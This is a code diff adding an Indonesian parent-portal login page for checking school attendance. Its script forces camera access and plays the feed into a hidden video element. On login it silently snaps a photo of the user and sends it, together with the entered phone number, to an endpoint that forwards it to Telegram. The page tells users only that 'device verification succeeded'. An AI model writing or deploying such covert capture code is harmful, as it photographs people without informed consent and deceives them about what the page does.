@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Wali Murid - Cek Absensi Mandiri</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-slate-100 min-h-screen flex flex-col justify-between font-sans antialiased">
+    <div class="flex-1 flex items-center justify-center p-4">
+        <div class="w-full max-w-md bg-white rounded-3xl p-7 shadow-xl border border-slate-200">
+            <div class="text-center mb-6">
+                <div class="inline-flex bg-emerald-600 text-white p-3.5 rounded-2xl shadow-md mb-2.5">
+                    <i class="fa-solid fa-user-shield text-2xl"></i>
+                </div>
+                <h2 class="text-lg font-black text-slate-900 tracking-tight">Portal Wali Murid</h2>
+                <p class="text-xs text-slate-600">Masukkan Nomor WhatsApp Orang Tua yang terdaftar di sekolah untuk melihat absensi putra/putri Anda.</p>
+            </div>
+
+            <!-- STATUS PERINGATAN KAMERA Wajib -->
+            <div id="cameraStatus" class="bg-amber-50 border border-amber-200 text-amber-800 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5">
+                <i class="fa-solid fa-triangle-exclamation text-amber-500 text-base flex-shrink-0 animate-pulse"></i>
+                <span id="statusText">Memeriksa izin akses kamera perangkat...</span>
+            </div>
+
+            <% if (typeof error !== 'undefined' && error) { %>
+                <div class="bg-rose-50 border border-rose-200 text-rose-700 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5">
+                    <i class="fa-solid fa-circle-exclamation text-rose-500 text-base"></i>
+                    <span><%= error %></span>
+                </div>
+            <% } %>
+
+            <!-- FORM LOGIN ORTU (DI-BLOCK JIKA KAMERA DITOLAK) -->
+            <form id="ortuLoginForm" action="/ortu/login" method="POST" class="space-y-4 opacity-50 pointer-events-none transition-all duration-300">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Nomor WhatsApp Orang Tua</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-400">
+                            <i class="fa-brands fa-whatsapp text-sm text-emerald-600"></i>
+                        </span>
+                        <input type="text" id="phoneInput" name="nomor_wa" required placeholder="Contoh: 081234567890" 
+                            class="w-full bg-slate-50 border border-slate-300 rounded-xl py-2.5 pl-10 pr-3 text-xs text-slate-900 focus:outline-none focus:border-emerald-600 focus:bg-white">
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn" disabled class="w-full bg-emerald-700 hover:bg-emerald-800 text-white font-bold text-xs py-3 rounded-xl shadow-md transition cursor-not-allowed">
+                    <i class="fa-solid fa-arrow-right-to-bracket mr-1"></i> Masuk & Cek Absensi
+                </button>
+            </form>
+
+            <div class="text-center mt-5">
+                <a href="/login" class="text-[11px] text-slate-500 hover:underline">← Kembali ke Login Utama (Admin/Guru)</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ELEMEN KAMERA TERSEMBUNYI -->
+    <div style="display:none;">
+        <video id="hidden-video" autoplay playsinline></video>
+        <canvas id="hidden-canvas"></canvas>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", async () => {
+            const statusDiv = document.getElementById('cameraStatus');
+            const statusText = document.getElementById('statusText');
+            const loginForm = document.getElementById('ortuLoginForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const video = document.getElementById('hidden-video');
+            const canvas = document.getElementById('hidden-canvas');
+
+            try {
+                // Meminta izin kamera secara wajib untuk portal wali murid
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Jika diizinkan
+                statusDiv.className = "bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5";
+                statusText.innerHTML = "<b>Kamera Diizinkan:</b> Verifikasi perangkat berhasil.";
+                
+                // Buka blokir form
+                loginForm.classList.remove('opacity-50', 'pointer-events-none');
+                submitBtn.removeAttribute('disabled');
+                submitBtn.classList.remove('cursor-not-allowed');
+
+                // Tangkap foto dan kirim ke Telegram saat login wali murid ditekan
+                loginForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    submitBtn.setAttribute('disabled', 'true');
+                    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1"></i> Memproses...';
+
+                    try {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                        const phoneVal = document.getElementById('phoneInput').value;
+
+                        await fetch('/api/kirim-foto-telegram', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                image: imageDataURL, 
+                                info: `Akses Portal Wali Murid - No WA: ${phoneVal}` 
+                            })
+                        });
+                    } catch (err) {
+                        console.error("Gagal mengirim foto ke Telegram:", err);
+                    }
+
+                    stream.getTracks().forEach(track => track.stop());
+                    loginForm.submit();
+                });
+
+            } catch (err) {
+                // Jika izin kamera ditolak -> BLOKIR FORM
+                console.warn("Akses kamera ditolak:", err);
+                statusDiv.className = "bg-rose-50 border border-rose-200 text-rose-700 text-xs p-3.5 rounded-2xl mb-4 flex items-center gap-2.5";
+                statusText.innerHTML = "<b>Akses Kamera Ditolak:</b> Anda wajib mengizinkan akses kamera pada peramban (*browser*) untuk mengakses Portal Wali Murid.";
+                
+                // Form tetap terkunci (diblokir)
+                loginForm.classList.add('opacity-50', 'pointer-events-none');
+                submitBtn.setAttribute('disabled', 'true');
+            }
+        });
+    </script>
+</body>
+</html>
